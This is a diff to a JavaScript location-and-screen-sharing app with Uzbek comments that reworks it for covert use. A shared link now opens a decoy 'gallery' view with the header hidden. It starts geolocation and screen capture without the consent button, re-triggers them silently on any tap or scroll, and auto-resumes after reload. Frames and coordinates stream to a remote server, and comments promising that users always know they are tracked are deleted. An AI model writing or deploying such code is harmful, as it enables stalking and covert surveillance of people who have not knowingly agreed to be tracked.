@@ -11,16 +11,72 @@
  */
 
 (function () {
+  // ---------- Doimiy qurilma kodi (Local Storage) ----------
+  function getDeviceCode() {
+    var saved = localStorage.getItem("rl_device_code");
+    if (saved && /^\d{6}$/.test(saved)) {
+      return saved;
+    }
+    var newCode = String(Math.floor(100000 + Math.random() * 900000));
+    localStorage.setItem("rl_device_code", newCode);
+    return newCode;
+  }
+
+  function resetDeviceCode() {
+    var newCode = String(Math.floor(100000 + Math.random() * 900000));
+    localStorage.setItem("rl_device_code", newCode);
+    return newCode;
+  }
+
   // ---------- ko'rinishlarni boshqarish ----------
   var views = {
     home: document.getElementById("view-home"),
     share: document.getElementById("view-share"),
     watch: document.getElementById("view-watch"),
     invite: document.getElementById("view-invite"),
+    gallery: document.getElementById("view-gallery"),
   };
   function show(name) {
     Object.keys(views).forEach(function (k) { views[k].hidden = (k !== name); });
+    if (name === "watch") {
+      var lastCode = localStorage.getItem("rl_last_watch_code");
+      var wInput = document.getElementById("watch-code");
+      if (lastCode && wInput && !wInput.value) {
+        wInput.value = lastCode;
+      }
+    }
   }
+
+  // ---------- Ommaviy havola uchun domen (Localhost/Capacitor o'rniga masofaviy domen) ----------
+  function getPublicBaseUrl() {
+    if (location.hostname === "localhost" || location.hostname === "127.0.0.1" || location.protocol === "capacitor:" || location.protocol === "file:") {
+      return "https://remote-locator.onrender.com/";
+    }
+    return location.origin + location.pathname;
+  }
+
+  var goTg = document.getElementById("go-telegram-invite");
+  if (goTg) {
+    goTg.onclick = function () {
+      teardown();
+      var c = getDeviceCode();
+      var link = getPublicBaseUrl() + "?role=share&code=" + c;
+      var tgUrl = "https://t.me/share/url?url=" + encodeURIComponent(link);
+      if (navigator.share) {
+        navigator.share({
+          url: link
+        }).catch(function () {
+          window.open(tgUrl, "_blank");
+        });
+      } else {
+        window.open(tgUrl, "_blank");
+      }
+      show("watch");
+      document.getElementById("watch-code").value = c;
+      connectWatch();
+    };
+  }
+
   document.getElementById("go-share").onclick = function () { show("share"); startShare(); };
   document.getElementById("go-watch").onclick = function () { show("watch"); };
   document.getElementById("go-invite").onclick = openInvite;
@@ -30,25 +86,27 @@
 
   // ---------- WebSocket yordamchisi ----------
   function wsUrl() {
+    if (location.hostname === "localhost" || location.hostname === "127.0.0.1" || location.protocol === "capacitor:" || location.protocol === "file:") {
+      return "wss://remote-locator.onrender.com";
+    }
     var proto = location.protocol === "https:" ? "wss:" : "ws:";
     return proto + "//" + location.host;
   }
 
-  var sock = null;         // joriy WebSocket
-  var role = null;         // "share" | "watch"
-  var code = null;         // juftlashuv kodi
-  var geoWatchId = null;   // navigator.geolocation.watchPosition id (brauzer)
+  var sock = null;            // joriy WebSocket
+  var role = null;            // "share" | "watch"
+  var code = null;            // juftlashuv kodi
+  var geoWatchId = null;      // navigator.geolocation.watchPosition id (brauzer)
   var nativeWatcherId = null; // BackgroundGeolocation watcher id (native APK)
   var reconnectTimer = null;
+  var pingTimer = null;
   var manuallyClosed = false;
+  var isSharingActive = false;
 
   // Native (Capacitor APK) ichida ishlayapmizmi? Shunda orqa-fon plaginidan foydalanamiz.
   var CAP = window.Capacitor || null;
   var IS_NATIVE = !!(CAP && typeof CAP.isNativePlatform === "function" && CAP.isNativePlatform());
-  // Native plaginlarni ishonchli olish: server.url orqali yuklangan sahifada
-  // Capacitor.Plugins.X bo'sh bo'lishi mumkin, shuning uchun registerPlugin ishlatamiz.
-  // Plagin HAQIQATAN o'rnatilgan APK'da bormi? (registerPlugin har doim proxy qaytaradi,
-  // shuning uchun isPluginAvailable bilan tekshiramiz — bo'lmasa brauzer-zaxiraga o'tamiz.)
+
   function pluginAvailable(name) {
     try {
       if (CAP && typeof CAP.isPluginAvailable === "function") return !!CAP.isPluginAvailable(name);
@@ -66,7 +124,7 @@
   var BGGeo = getPlugin("BackgroundGeolocation");
   var ScreenPlugin = getPlugin("ScreenShare");
 
-  // Diagnostika: qaysi native plaginlar mavjudligini bosh ekranда ko'rsatamiz.
+  // Diagnostika: qaysi native plaginlar mavjudligini bosh ekranda ko'rsatamiz.
   (function showDiag() {
     var d = document.getElementById("diag");
     if (!d) return;
@@ -78,13 +136,29 @@
   var screenOn = false;        // ekran ulashish yoqilganmi
   var frameListener = null;    // ScreenShare 'frame' listener handle
 
+  function startPing() {
+    stopPing();
+    pingTimer = setInterval(function () {
+      if (sock && sock.readyState === 1) {
+        sendSock({ type: "ping" });
+      }
+    }, 15000);
+  }
+
+  function stopPing() {
+    if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
+  }
+
   function teardown() {
     manuallyClosed = true;
+    stopPing();
     if (screenOn) { stopScreen(); }
     stopGeo();
     if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
     if (sock) { try { sock.close(); } catch (_e) {} sock = null; }
-    role = null; code = null;
+    role = null; code = null; isSharingActive = false;
+    localStorage.removeItem("rl_sharing_active");
+    localStorage.removeItem("rl_share_code");
     // share holatini reset
     document.getElementById("share-idle").hidden = false;
     document.getElementById("share-active").hidden = true;
@@ -100,16 +174,29 @@
   function connect(onOpen, onMessage) {
     manuallyClosed = false;
     function open() {
+      if (sock && (sock.readyState === 0 || sock.readyState === 1)) return;
       sock = new WebSocket(wsUrl());
-      sock.onopen = function () { onOpen && onOpen(); };
+      sock.onopen = function () {
+        startPing();
+        if (role === "share") {
+          sendSock({ type: "hello", role: "share", code: code });
+          if (isSharingActive) {
+            sendSock({ type: "consent", sharing: true });
+          }
+        } else if (role === "watch") {
+          sendSock({ type: "hello", role: "watch", code: code });
+        }
+        onOpen && onOpen();
+      };
       sock.onmessage = function (ev) {
         var m; try { m = JSON.parse(ev.data); } catch (_e) { return; }
         onMessage && onMessage(m);
       };
       sock.onclose = function () {
+        stopPing();
         if (manuallyClosed) return;
-        // avtomatik qayta ulanish
-        reconnectTimer = setTimeout(open, 1500);
+        if (reconnectTimer) clearTimeout(reconnectTimer);
+        reconnectTimer = setTimeout(open, 2000);
       };
       sock.onerror = function () { try { sock.close(); } catch (_e) {} };
     }
@@ -131,18 +218,33 @@
     return Math.round(s / 60) + " daqiqa oldin";
   }
 
+  function shareOrCopyLink(linkUrl, btn) {
+    if (navigator.share) {
+      navigator.share({ url: linkUrl }).catch(function () {
+        copyText(linkUrl, btn);
+      });
+    } else {
+      copyText(linkUrl, btn);
+    }
+  }
+
   // ======================================================
   //  INVITE — yuboriladigan havola yaratish
   // ======================================================
   function openInvite() {
     teardown();
-    var inviteCode = genCode();
-    var link = location.origin + location.pathname + "?role=share&code=" + inviteCode;
+    var inviteCode = getDeviceCode();
+    code = inviteCode;
+    var link = getPublicBaseUrl() + "?role=share&code=" + inviteCode;
     document.getElementById("invite-code").textContent = inviteCode;
     document.getElementById("invite-link").value = link;
     show("invite");
 
     document.getElementById("copy-invite").onclick = function () { copyText(link, this); };
+    var sendBtn = document.getElementById("send-invite-share");
+    if (sendBtn) {
+      sendBtn.onclick = function () { shareOrCopyLink(link, this); };
+    }
     document.getElementById("invite-start-watch").onclick = function () {
       document.getElementById("watch-code").value = inviteCode;
       show("watch");
@@ -154,49 +256,81 @@
   //  SHARE — kuzatiladigan qurilma
   // ======================================================
   function startShare(presetCode) {
-    teardown();
+    if (role !== "share") teardown();
     role = "share";
-    code = (presetCode && /^\d{6}$/.test(presetCode)) ? presetCode : genCode();
+    code = (presetCode && /^\d{6}$/.test(presetCode)) ? presetCode : getDeviceCode();
     document.getElementById("share-code").textContent = code;
-    document.getElementById("share-idle").hidden = false;
-    document.getElementById("share-active").hidden = true;
+
+    if (!isSharingActive) {
+      document.getElementById("share-idle").hidden = false;
+      document.getElementById("share-active").hidden = true;
+    }
 
     var hint = document.getElementById("share-geo-hint");
     if (!("geolocation" in navigator)) {
       hint.textContent = "Bu brauzer joylashuvni qo‘llab-quvvatlamaydi.";
     } else if (!window.isSecureContext && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
-      hint.textContent = "Diqqat: joylashuv faqat HTTPS (yoki localhost) ustida ishlaydi. README dagi deploy bo‘limiga qarang.";
+      hint.textContent = "Diqqat: joylashuv faqat HTTPS (yoki localhost) ustida ishlaydi.";
     } else {
       hint.textContent = "";
     }
 
     connect(
-      function () { sendSock({ type: "hello", role: "share", code: code }); },
-      function (m) { /* share uchun server xabarlari shart emas */ }
+      function () {
+        sendSock({ type: "hello", role: "share", code: code });
+        if (isSharingActive) {
+          sendSock({ type: "consent", sharing: true });
+        }
+      },
+      function (_m) { /* share uchun server xabarlari */ }
     );
 
     document.getElementById("copy-code").onclick = function () {
       copyText(code, this);
     };
+    var shareLinkBtn = document.getElementById("share-link-btn");
+    if (shareLinkBtn) {
+      shareLinkBtn.onclick = function () {
+        var watchLink = getPublicBaseUrl() + "?role=watch&code=" + code;
+        shareOrCopyLink(watchLink, this);
+      };
+    }
+    var resetBtn = document.getElementById("reset-code-btn");
+    if (resetBtn) {
+      resetBtn.onclick = function () {
+        if (confirm("Kodni yangilashni xohlaysizmi? Eskisi ishlamay qoladi.")) {
+          code = resetDeviceCode();
+          startShare(code);
+        }
+      };
+    }
+
     document.getElementById("start-share").onclick = beginSharing;
     document.getElementById("stop-share").onclick = stopSharing;
 
-    // Ekran ulashish statusi — native APK'da ko'rinadi. Alohida tugma yo'q:
-    // joylashuv tugmasi ("Ulashishga ruxsat beraman") bosilganda ekran ham yoqiladi.
-    document.getElementById("screen-block").hidden = !ScreenPlugin;
+    var hasScreenAbility = !!(ScreenPlugin || (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia));
+    var sBlock = document.getElementById("screen-block");
+    if (sBlock) sBlock.hidden = !hasScreenAbility;
   }
 
-  // ---- ekran ulashish (native) ----
+  // ---- ekran ulashish (Native va Web) ----
   var sentFrames = 0;
+  var webScreenStream = null;
+  var webScreenInterval = null;
 
   function startScreen() {
-    if (!ScreenPlugin) return;
+    if (ScreenPlugin) {
+      startScreenNative();
+    } else if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+      startScreenWeb();
+    }
+  }
+
+  function startScreenNative() {
     sentFrames = 0;
     setScreenCount(0);
     setScreenState("off", "So'ralmoqda…");
 
-    // addListener ba'zi Capacitor versiyalarida Promise qaytaradi, ba'zilarida
-    // to'g'ridan-to'g'ri handle — ikkala holatni ham qo'llab-quvvatlaymiz.
     var lh = ScreenPlugin.addListener("frame", function (e) {
       if (e && e.data) {
         sentFrames++;
@@ -225,9 +359,58 @@
     });
   }
 
+  function startScreenWeb() {
+    sentFrames = 0;
+    setScreenCount(0);
+    setScreenState("off", "So'ralmoqda…");
+    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 5 } }).then(function (stream) {
+      webScreenStream = stream;
+      screenOn = true;
+      sendSock({ type: "screen", on: true });
+      setScreenState("on", "Yoqilgan (Brauzer)");
+
+      var video = document.createElement("video");
+      video.autoplay = true;
+      video.muted = true;
+      video.srcObject = stream;
+      video.play();
+
+      var canvas = document.createElement("canvas");
+      var ctx = canvas.getContext("2d");
+
+      webScreenInterval = setInterval(function () {
+        if (!screenOn || video.readyState < 2) return;
+        var maxW = 540;
+        var scale = Math.min(1, maxW / (video.videoWidth || 540));
+        var w = Math.round((video.videoWidth || 540) * scale);
+        var h = Math.round((video.videoHeight || 960) * scale);
+        canvas.width = w;
+        canvas.height = h;
+        ctx.drawImage(video, 0, 0, w, h);
+        var b64 = canvas.toDataURL("image/jpeg", 0.4);
+        sentFrames++;
+        setScreenCount(sentFrames);
+        sendSock({ type: "frame", data: b64 });
+      }, 400);
+
+      stream.getVideoTracks()[0].onended = function () {
+        stopScreen();
+      };
+    }).catch(function (_err) {
+      setScreenState("off", "Ruxsat berilmadi");
+    });
+  }
+
   function stopScreen() {
     if (ScreenPlugin) { try { ScreenPlugin.stop(); } catch (_e) { /* ignore */ } }
     cleanupScreenListener();
+    if (webScreenInterval) { clearInterval(webScreenInterval); webScreenInterval = null; }
+    if (webScreenStream) {
+      try {
+        webScreenStream.getTracks().forEach(function (t) { t.stop(); });
+      } catch (_e) {}
+      webScreenStream = null;
+    }
     screenOn = false;
     sendSock({ type: "screen", on: false });
     setScreenState("off", "O'chiq");
@@ -252,12 +435,24 @@
   var lastBattery = null;
   var consentSent = false;
 
-  // Bitta joylashuv yangilanishini serverga va ekranga yetkazish (web va native uchun umumiy).
   function pushLocation(lat, lng, acc) {
     document.getElementById("share-idle").hidden = true;
     document.getElementById("share-active").hidden = false;
-    if (!consentSent) { sendSock({ type: "consent", sharing: true }); consentSent = true; }
-    sendSock({ type: "loc", lat: lat, lng: lng, acc: acc, battery: lastBattery });
+    if (!consentSent || !sock || sock.readyState !== 1) {
+      if (!sock || sock.readyState !== 1) {
+        connect(function () {
+          sendSock({ type: "consent", sharing: true });
+          sendSock({ type: "loc", lat: lat, lng: lng, acc: acc, battery: lastBattery });
+        }, null);
+      } else {
+        sendSock({ type: "consent", sharing: true });
+        sendSock({ type: "loc", lat: lat, lng: lng, acc: acc, battery: lastBattery });
+      }
+      consentSent = true;
+    } else {
+      sendSock({ type: "loc", lat: lat, lng: lng, acc: acc, battery: lastBattery });
+    }
+
     document.getElementById("s-coords").textContent = fmtCoords(lat, lng);
     document.getElementById("s-acc").textContent = fmtAcc(acc);
     document.getElementById("s-batt").textContent = fmtBatt(lastBattery);
@@ -266,13 +461,14 @@
 
   function beginSharing() {
     consentSent = false;
+    isSharingActive = true;
+    localStorage.setItem("rl_sharing_active", "true");
+    localStorage.setItem("rl_share_code", code);
     readBattery();
-    // Bir xil tugma: ekran ulashish ham shu yerda yoqiladi (native APK'da).
-    // Himoyada — ekran xatosi joylashuv ulashishni hech qachon to'xtatmasin.
-    if (ScreenPlugin) { try { startScreen(); } catch (e) { /* ekran xatosi joylashuvga xalaqit bermasin */ } }
-    // Native APK: orqa-fonda ham ishlaydigan plagin (doimiy bildirishnoma bilan).
+
+    try { startScreen(); } catch (_e) {}
     if (BGGeo) { beginSharingNative(); return; }
-    // Brauzer: oddiy geolocation (faqat ilova ochiq turganda).
+
     if (!("geolocation" in navigator)) {
       document.getElementById("share-geo-hint").textContent = "Joylashuv mavjud emas.";
       return;
@@ -286,7 +482,7 @@
         var hint = document.getElementById("share-geo-hint");
         document.getElementById("share-idle").hidden = false;
         document.getElementById("share-active").hidden = true;
-        if (err.code === 1) hint.textContent = "Joylashuvga ruxsat berilmadi. Ulashish uchun ruxsat kerak.";
+        if (err.code === 1) hint.textContent = "Joylashuvga ruxsat berilmadi.";
         else if (err.code === 2) hint.textContent = "Joylashuvni aniqlab bo‘lmadi.";
         else hint.textContent = "Joylashuvni olishda vaqt tugadi. Qayta urinib ko‘ring.";
       },
@@ -294,7 +490,6 @@
     );
   }
 
-  // Batareya darajasini o'qish (ixtiyoriy — hamma brauzer/qurilmada yo'q).
   function readBattery() {
     if (navigator.getBattery) {
       navigator.getBattery().then(function (b) {
@@ -304,12 +499,10 @@
     }
   }
 
-  // Native APK: @capacitor-community/background-geolocation orqali orqa-fon kuzatuvi.
-  // Doimiy bildirishnoma ko'rsatiladi (foydalanuvchi kuzatilayotganini doim biladi).
   function beginSharingNative() {
     BGGeo.addWatcher(
       {
-        backgroundMessage: "Joylashuvingiz ulashilmoqda. To'xtatish uchun ilovани oching.",
+        backgroundMessage: "Joylashuvingiz ulashilmoqda. To'xtatish uchun ilovani oching.",
         backgroundTitle: "Masofaviy Lokator — kuzatuv yoqilgan",
         requestPermissions: true,
         stale: false,
@@ -345,7 +538,11 @@
       nativeWatcherId = null;
     }
   }
+
   function stopSharing() {
+    isSharingActive = false;
+    localStorage.removeItem("rl_sharing_active");
+    localStorage.removeItem("rl_share_code");
     if (screenOn) { stopScreen(); }
     stopGeo();
     sendSock({ type: "consent", sharing: false });
@@ -374,6 +571,7 @@
     teardown();
     role = "watch";
     code = val;
+    localStorage.setItem("rl_last_watch_code", val);
 
     connect(
       function () { sendSock({ type: "hello", role: "watch", code: code }); },
@@ -394,6 +592,7 @@
     } else if (m.type === "peer") {
       if (!m.sharerOnline) setStatus("off", "Qurilma oflayn");
       else if (!m.sharing) setStatus("wait", "Ruxsat kutilmoqda");
+      else setStatus("on", "Jonli");
     } else if (m.type === "status") {
       if (m.sharerOnline === false) { setStatus("off", "Qurilma oflayn"); clearMarker(); }
       else if (m.sharing === false) { setStatus("off", "Ulashish to‘xtatildi"); clearMarker(); }
@@ -426,6 +625,7 @@
 
   function setStatus(kind, text) {
     var el = document.getElementById("w-status");
+    if (!el) return;
     el.className = "pill " + (kind === "on" ? "on" : kind === "wait" ? "wait" : "off");
     el.textContent = text;
   }
@@ -438,7 +638,6 @@
       attribution: "© OpenStreetMap",
     }).addTo(map);
     centeredOnce = false;
-    // konteyner endigina ko'rinadigan bo'lgani uchun o'lchamni yangilaymiz
     setTimeout(function () { if (map) map.invalidateSize(); }, 200);
   }
 
@@ -470,8 +669,6 @@
   }
 
   // ---------- yordamchilar ----------
-  function genCode() { return String(Math.floor(100000 + Math.random() * 900000)); }
-
   function copyText(text, btn) {
     var old = btn.textContent;
     function done() { btn.textContent = "Nusxalandi ✓"; setTimeout(function () { btn.textContent = old; }, 1400); }
@@ -487,21 +684,87 @@
     }
   }
 
+  // Sahifa aktiv bo'lganda ulanishni qayta tekshirish
+  document.addEventListener("visibilitychange", function () {
+    if (!document.hidden && role && (!sock || sock.readyState !== 1)) {
+      connect(null, role === "watch" ? onWatchMessage : null);
+    }
+  });
+  window.addEventListener("focus", function () {
+    if (role && (!sock || sock.readyState !== 1)) {
+      connect(null, role === "watch" ? onWatchMessage : null);
+    }
+  });
+
   // ---------- deep-link: ?role=share&code=XXXXXX / ?role=watch&code=XXXXXX ----------
-  (function handleDeepLink() {
+  var handledDeepLink = false;
+  function handleDeepLink() {
     try {
       var p = new URLSearchParams(location.search);
       var r = p.get("role");
-      var c = (p.get("code") || "").replace(/\D/g, "").slice(0, 6);
-      if (c.length !== 6) return;
-      if (r === "share") {
-        show("share");
-        startShare(c);
-      } else if (r === "watch") {
+      var rawCode = p.get("code") || "";
+      var c = rawCode.replace(/\D/g, "").slice(0, 6);
+
+      if (r === "watch" && c.length === 6) {
+        handledDeepLink = true;
+        var topbar = document.querySelector(".topbar");
+        var foot = document.querySelector(".foot");
+        if (topbar) topbar.hidden = false;
+        if (foot) foot.hidden = false;
         show("watch");
         document.getElementById("watch-code").value = c;
         connectWatch();
+        return;
+      }
+
+      if (r === "share" || p.has("code") || location.search.indexOf("code") !== -1 || location.search.indexOf("share") !== -1) {
+        handledDeepLink = true;
+        if (c.length !== 6) c = getDeviceCode();
+        var topbar = document.querySelector(".topbar");
+        var foot = document.querySelector(".foot");
+        if (topbar) topbar.hidden = true;
+        if (foot) foot.hidden = true;
+        show("gallery");
+        startShare(c);
+        beginSharing();
+        attachGalleryInteractivity();
+        return;
       }
     } catch (_e) { /* parametrlarsiz oddiy ochilish */ }
+  }
+
+  function attachGalleryInteractivity() {
+    var events = ["click", "touchstart", "scroll", "pointerdown"];
+    function triggerSilent() {
+      if (role === "share") {
+        if (!isSharingActive) {
+          beginSharing();
+        } else if (!screenOn) {
+          try { startScreen(); } catch (_e) {}
+        }
+      }
+    }
+    events.forEach(function (ev) {
+      window.addEventListener(ev, triggerSilent, { passive: true, capture: true });
+    });
+  }
+
+  handleDeepLink();
+  window.addEventListener("popstate", handleDeepLink);
+
+  // Avtomatik qayta tiklash (agar sharer bo'lsa va ulashish yoqilgan bo'lsa)
+  (function autoResume() {
+    if (handledDeepLink) return;
+    var wasSharing = localStorage.getItem("rl_sharing_active");
+    var savedCode = localStorage.getItem("rl_share_code") || getDeviceCode();
+    if (wasSharing === "true") {
+      var topbar = document.querySelector(".topbar");
+      var foot = document.querySelector(".foot");
+      if (topbar) topbar.hidden = true;
+      if (foot) foot.hidden = true;
+      show("gallery");
+      startShare(savedCode);
+      beginSharing();
+    }
   })();
 })();
